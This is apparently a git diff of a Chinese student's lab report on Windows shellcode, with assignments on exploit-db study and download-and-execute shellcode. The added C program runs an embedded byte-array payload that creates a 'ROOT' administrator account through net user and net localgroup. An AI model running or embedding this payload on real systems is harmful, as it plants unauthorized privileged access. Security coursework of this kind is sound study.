@@ -1,18 +1,11 @@
-# 
+# ShellCode
 ## 实验背景
 ## 实验完成度
 ## 作业
 1. 详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。
 2. 修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
 3. 其中第二个作业，原参考代码只调用了一个API函数，作业要求调用更多的API函数了，其中涉及到的参数也更复杂，但是原理是相通的。URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以可能还需要调用LoadLibrary函数
-## 参考资料
-* [microsoft !peb](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-peb)
-* [PEB结构学习](https://www.cnblogs.com/binlmmhc/p/6501545.html)
-* [microsoft PEB structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
-* [Process_Environment_Block](https://en.wikipedia.org/wiki/Process_Environment_Block)
-* [x]
-* [x]
-* [x]
+
 ## 课内实验
 [Null-Free WinExec Calc.exe Shellcode](https://www.exploit-db.com/shellcodes/48116)
 1. 这个shellcode的功能是运行一个计算器程序。这个是白帽子黑客们在编写PoC时最常使用的一种方法。能证明系统被控制，因为如果能悄无声息的运行计算机程序，理论上来说就能运行任何程序，改一个参数的事。
@@ -81,8 +74,45 @@ for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo 
 * 636c6163，6578652e是 calc.exe的big ending 反写。压入栈以后，就形成了字符串。这样就把字符串嵌入机器指令了，作为机器指令的操作数。            
 ![](./img/fanxie.png)                 
 ## 实验过程
-![](./img/)                                      
-![](./img/)                                      
+1. 进入[exploit-db](https://www.exploit-db.com),点击旁边列表里的shellcode,挑选不同平台的 3-4个shellcode
+![](./img/shelllist.png)                                      
+2. 通过filter筛选平台为windows的                           
+![](./img/filterwin.png)                                      
+### 
+1.
+```cpp
+#include <windows.h>
+#include <stdio.h>
+
+char code[] = \
+"\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x1c"
+"\xad\x96\xad\x8b\x40\x08\x50\x8b\x58\x3c\x01\xc3"
+"\x8b\x5b\x78\x01\xc3\x8b\x53\x20\x01\xc2\x8b\x4b"
+"\x24\x01\xc1\x51\x8b\x7b\x1c\x01\xc7\x57\x68\x57"
+"\x69\x6e\x45\x31\xc0\x89\xd7\x89\xe6\x31\xc9\xfc"
+"\x8b\x3c\x87\x03\x7c\x24\x0c\x66\x83\xc1\x04\xf3"
+"\xa6\x74\x03\x40\xeb\xe7\x8b\x4c\x24\x08\x66\x8b"
+"\x04\x41\x8b\x54\x24\x04\x8b\x1c\x82\x03\x5c\x24"
+"\x0c\x31\xc9\xf7\xe1\xb0\x44\x50\x68\x20\x2f\x41"
+"\x44\x68\x52\x4f\x4f\x54\x68\x6f\x72\x73\x20\x68"
+"\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41"
+"\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67"
+"\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
+"\x44\x20\x26\x68\x24\x20\x2f\x41\x68\x52\x30\x30"
+"\x54\x68\x20\x49\x40\x6d\x68\x52\x4f\x4f\x54\x68"
+"\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63"
+"\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e"
+"\x89\xe0\x51\x50\xff\xd3";
+
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int(*)()) code;
+  (int)(*func)();
+}
+```
+将代码复制并将.cpp改成.c,然后运行
+
 ![](./img/)                                      
 ![](./img/)                                      
 ![](./img/)                                      
@@ -121,15 +151,14 @@ for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo 
 ## 实验结论
 
 ## 参考资料
-* []()
-* []()
-* []()
-* []()
-* []()
-* []()
-* []()
-* []()
-
+* [microsoft !peb](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-peb)
+* [PEB结构学习](https://www.cnblogs.com/binlmmhc/p/6501545.html)
+* [microsoft PEB structure](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
+* [Process_Environment_Block](https://en.wikipedia.org/wiki/Process_Environment_Block)
+* [x]
+* [x]
+* [x]
+https://www.exploit-db.com/shellcodes/46492
 ![](./img/)                                      
 ![](./img/)                                      
 ![](./img/)                                      
